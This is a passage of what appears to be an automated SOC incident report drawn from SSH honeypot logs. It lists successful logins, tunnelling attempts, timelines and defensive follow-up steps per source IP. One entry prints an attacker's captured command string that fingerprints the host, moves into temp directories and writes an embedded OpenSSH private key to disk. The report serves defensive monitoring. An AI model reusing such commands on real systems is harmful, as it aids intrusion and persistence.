**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f42d9d5c61e8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:44 |
| **Last Seen** | 2026-08-24 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:44:12` | `cowrie.session.connect` |
| `2026-08-24 03:44:12` | `cowrie.client.version` |
| `2026-08-24 03:44:13` | `cowrie.client.kex` |
| `2026-08-24 03:44:14` | `cowrie.login.success` |
| `2026-08-24 03:44:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:44:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:44:14` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624e03ca1708

| Field | Detail |
|---|---|
| **Source IP** | `112.29.68[.]22` |
| **First Seen** | 2026-08-24 03:45 |
| **Last Seen** | 2026-08-24 03:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:45:41` | `cowrie.session.connect` |
| `2026-08-24 03:45:41` | `cowrie.client.version` |
| `2026-08-24 03:45:41` | `cowrie.client.kex` |
| `2026-08-24 03:45:43` | `cowrie.login.success` |
| `2026-08-24 03:45:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.29.68[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.29.68[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e65ac2be643

| Field | Detail |
|---|---|
| **Source IP** | `183.103.216[.]254` |
| **First Seen** | 2026-08-24 03:45 |
| **Last Seen** | 2026-08-24 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:45:51` | `cowrie.session.connect` |
| `2026-08-24 03:45:52` | `cowrie.client.version` |
| `2026-08-24 03:45:52` | `cowrie.client.kex` |
| `2026-08-24 03:45:54` | `cowrie.login.success` |
| `2026-08-24 03:45:55` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.103.216[.]254` to AbuseIPDB if not already reported
- [ ] Block `183.103.216[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95fdb9abe170

| Field | Detail |
|---|---|
| **Source IP** | `109.186.74[.]107` |
| **First Seen** | 2026-08-24 03:49 |
| **Last Seen** | 2026-08-24 03:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:49:45` | `cowrie.session.connect` |
| `2026-08-24 03:49:45` | `cowrie.client.version` |
| `2026-08-24 03:49:45` | `cowrie.client.kex` |
| `2026-08-24 03:49:47` | `cowrie.login.success` |
| `2026-08-24 03:49:47` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.186.74[.]107` to AbuseIPDB if not already reported
- [ ] Block `109.186.74[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2605938fbec

| Field | Detail |
|---|---|
| **Source IP** | `104.248.83[.]99` |
| **First Seen** | 2026-08-24 03:49 |
| **Last Seen** | 2026-08-24 03:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:49:52` | `cowrie.session.connect` |
| `2026-08-24 03:49:53` | `cowrie.client.version` |
| `2026-08-24 03:49:53` | `cowrie.client.kex` |
| `2026-08-24 03:49:53` | `cowrie.login.success` |
| `2026-08-24 03:49:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.83[.]99` to AbuseIPDB if not already reported
- [ ] Block `104.248.83[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361641f79ba4

| Field | Detail |
|---|---|
| **Source IP** | `209.145.59[.]90` |
| **First Seen** | 2026-08-24 03:50 |
| **Last Seen** | 2026-08-24 03:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:50:10` | `cowrie.session.connect` |
| `2026-08-24 03:50:11` | `cowrie.client.version` |
| `2026-08-24 03:50:11` | `cowrie.client.kex` |
| `2026-08-24 03:50:12` | `cowrie.login.success` |
| `2026-08-24 03:50:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.59[.]90` to AbuseIPDB if not already reported
- [ ] Block `209.145.59[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4b7261bee0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:53 |
| **Last Seen** | 2026-08-24 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:53:37` | `cowrie.session.connect` |
| `2026-08-24 03:53:37` | `cowrie.client.version` |
| `2026-08-24 03:53:37` | `cowrie.client.kex` |
| `2026-08-24 03:53:38` | `cowrie.login.success` |
| `2026-08-24 03:53:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:53:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:53:39` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af0d453e0e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:53 |
| **Last Seen** | 2026-08-24 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:53:41` | `cowrie.session.connect` |
| `2026-08-24 03:53:41` | `cowrie.client.version` |
| `2026-08-24 03:53:41` | `cowrie.client.kex` |
| `2026-08-24 03:53:42` | `cowrie.login.success` |
| `2026-08-24 03:53:42` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:53:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:53:42` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d80e1991cd28

| Field | Detail |
|---|---|
| **Source IP** | `163.7.1[.]156` |
| **First Seen** | 2026-08-24 03:54 |
| **Last Seen** | 2026-08-24 03:54 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:54:23` | `cowrie.session.connect` |
| `2026-08-24 03:54:36` | `cowrie.client.version` |
| `2026-08-24 03:54:37` | `cowrie.client.kex` |
| `2026-08-24 03:54:39` | `cowrie.login.success` |
| `2026-08-24 03:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.1[.]156` to AbuseIPDB if not already reported
- [ ] Block `163.7.1[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb4cac03bc8

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-24 03:54 |
| **Last Seen** | 2026-08-24 03:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:54:40` | `cowrie.session.connect` |
| `2026-08-24 03:54:40` | `cowrie.client.version` |
| `2026-08-24 03:54:40` | `cowrie.client.kex` |
| `2026-08-24 03:54:40` | `cowrie.login.success` |
| `2026-08-24 03:54:42` | `cowrie.session.params` |
| `2026-08-24 03:54:42` | `cowrie.command.input` |
| `2026-08-24 03:54:42` | `cowrie.session.file_download` |
| `2026-08-24 03:54:42` | `cowrie.session.file_download` |
| `2026-08-24 03:54:42` | `cowrie.log.closed` |
| `2026-08-24 03:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641d183d73ef

| Field | Detail |
|---|---|
| **Source IP** | `110.44.126[.]195` |
| **First Seen** | 2026-08-24 03:54 |
| **Last Seen** | 2026-08-24 03:59 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:54:41` | `cowrie.session.connect` |
| `2026-08-24 03:54:42` | `cowrie.client.version` |
| `2026-08-24 03:54:42` | `cowrie.client.kex` |
| `2026-08-24 03:54:45` | `cowrie.login.success` |
| `2026-08-24 03:54:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.44.126[.]195` to AbuseIPDB if not already reported
- [ ] Block `110.44.126[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12bd8a5854ef

| Field | Detail |
|---|---|
| **Source IP** | `177.244.29[.]30` |
| **First Seen** | 2026-08-24 03:54 |
| **Last Seen** | 2026-08-24 03:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:54:52` | `cowrie.session.connect` |
| `2026-08-24 03:54:53` | `cowrie.client.version` |
| `2026-08-24 03:54:53` | `cowrie.client.kex` |
| `2026-08-24 03:54:54` | `cowrie.login.success` |
| `2026-08-24 03:54:54` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.244.29[.]30` to AbuseIPDB if not already reported
- [ ] Block `177.244.29[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f1c06aed56

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:03 |
| **Last Seen** | 2026-08-24 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:03:06` | `cowrie.session.connect` |
| `2026-08-24 04:03:06` | `cowrie.client.version` |
| `2026-08-24 04:03:07` | `cowrie.client.kex` |
| `2026-08-24 04:03:07` | `cowrie.login.success` |
| `2026-08-24 04:03:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:03:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:03:08` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecbcb21a3ed2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:03 |
| **Last Seen** | 2026-08-24 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:03:10` | `cowrie.session.connect` |
| `2026-08-24 04:03:10` | `cowrie.client.version` |
| `2026-08-24 04:03:10` | `cowrie.client.kex` |
| `2026-08-24 04:03:11` | `cowrie.login.success` |
| `2026-08-24 04:03:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:03:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:03:12` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327a24113198

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 04:05 |
| **Last Seen** | 2026-08-24 04:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:05:25` | `cowrie.session.connect` |
| `2026-08-24 04:05:25` | `cowrie.client.version` |
| `2026-08-24 04:05:25` | `cowrie.client.kex` |
| `2026-08-24 04:05:25` | `cowrie.login.success` |
| `2026-08-24 04:05:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:05:26` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49038307bb88

| Field | Detail |
|---|---|
| **Source IP** | `59.93.107[.]172` |
| **First Seen** | 2026-08-24 04:10 |
| **Last Seen** | 2026-08-24 04:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:10:14` | `cowrie.session.connect` |
| `2026-08-24 04:10:15` | `cowrie.client.version` |
| `2026-08-24 04:10:15` | `cowrie.client.kex` |
| `2026-08-24 04:10:16` | `cowrie.login.success` |
| `2026-08-24 04:10:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.107[.]172` to AbuseIPDB if not already reported
- [ ] Block `59.93.107[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5118e9aa8207

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-08-24 04:10 |
| **Last Seen** | 2026-08-24 04:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:10:23` | `cowrie.session.connect` |
| `2026-08-24 04:10:23` | `cowrie.client.version` |
| `2026-08-24 04:10:23` | `cowrie.client.kex` |
| `2026-08-24 04:10:25` | `cowrie.login.success` |
| `2026-08-24 04:10:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9438d6da009f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:12 |
| **Last Seen** | 2026-08-24 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:12:45` | `cowrie.session.connect` |
| `2026-08-24 04:12:45` | `cowrie.client.version` |
| `2026-08-24 04:12:45` | `cowrie.client.kex` |
| `2026-08-24 04:12:46` | `cowrie.login.success` |
| `2026-08-24 04:12:46` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:12:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:12:46` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9e10592d9b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:12 |
| **Last Seen** | 2026-08-24 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:12:48` | `cowrie.session.connect` |
| `2026-08-24 04:12:48` | `cowrie.client.version` |
| `2026-08-24 04:12:48` | `cowrie.client.kex` |
| `2026-08-24 04:12:49` | `cowrie.login.success` |
| `2026-08-24 04:12:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:12:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:12:50` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6928ef91c111

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-08-24 04:13 |
| **Last Seen** | 2026-08-24 04:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:13:07` | `cowrie.session.connect` |
| `2026-08-24 04:13:08` | `cowrie.client.version` |
| `2026-08-24 04:13:08` | `cowrie.client.kex` |
| `2026-08-24 04:13:11` | `cowrie.login.success` |
| `2026-08-24 04:13:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809962bb8441

| Field | Detail |
|---|---|
| **Source IP** | `176.103.15[.]169` |
| **First Seen** | 2026-08-24 04:13 |
| **Last Seen** | 2026-08-24 04:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:13:18` | `cowrie.session.connect` |
| `2026-08-24 04:13:18` | `cowrie.client.version` |
| `2026-08-24 04:13:18` | `cowrie.client.kex` |
| `2026-08-24 04:13:19` | `cowrie.login.success` |
| `2026-08-24 04:13:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.103.15[.]169` to AbuseIPDB if not already reported
- [ ] Block `176.103.15[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5be5875178c6

| Field | Detail |
|---|---|
| **Source IP** | `85.228.158[.]217` |
| **First Seen** | 2026-08-24 04:22 |
| **Last Seen** | 2026-08-24 04:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:22:13` | `cowrie.session.connect` |
| `2026-08-24 04:22:13` | `cowrie.client.version` |
| `2026-08-24 04:22:13` | `cowrie.client.kex` |
| `2026-08-24 04:22:14` | `cowrie.login.success` |
| `2026-08-24 04:22:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.228.158[.]217` to AbuseIPDB if not already reported
- [ ] Block `85.228.158[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c65a6659d0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:22 |
| **Last Seen** | 2026-08-24 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:22:21` | `cowrie.session.connect` |
| `2026-08-24 04:22:21` | `cowrie.client.version` |
| `2026-08-24 04:22:21` | `cowrie.client.kex` |
| `2026-08-24 04:22:22` | `cowrie.login.success` |
| `2026-08-24 04:22:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:22:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:22:23` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2991074d4b93

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:22 |
| **Last Seen** | 2026-08-24 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
